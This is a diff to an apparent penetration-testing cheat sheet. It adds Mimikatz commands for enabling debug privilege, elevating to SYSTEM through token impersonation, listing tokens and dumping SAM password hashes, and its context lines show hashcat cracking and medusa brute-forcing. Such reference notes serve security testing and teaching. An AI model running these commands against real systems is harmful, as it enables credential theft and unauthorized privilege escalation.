@@ -1165,7 +1165,7 @@ hashcat -m hash_format_code_here /path/to/hash /path/to/wordlist
 ## HASHID
 ```bash
 # identify hash type
-hashid hash_here
+hashid 'hash_here'
 ```
 
 
@@ -1393,6 +1393,23 @@ medusa -h target_IP -U /path/to/user_name_list -P /path/to/wordlist -M module_he
 
 # list modules
 medusa -d
+```
+
+
+
+## MIMIKATZ
+```powershell
+# enable SeDebugPrivilege (tamper with other processes)
+privilege::debug
+
+# priv esc from Administrator to SYSTEM via token impersonation (if mimikatz launched as Administrator)
+token::elevate
+
+# list available tokens (= logged in users)
+token::list
+
+# dump hashes from SAM
+lsadump::sam
 ```
 
 
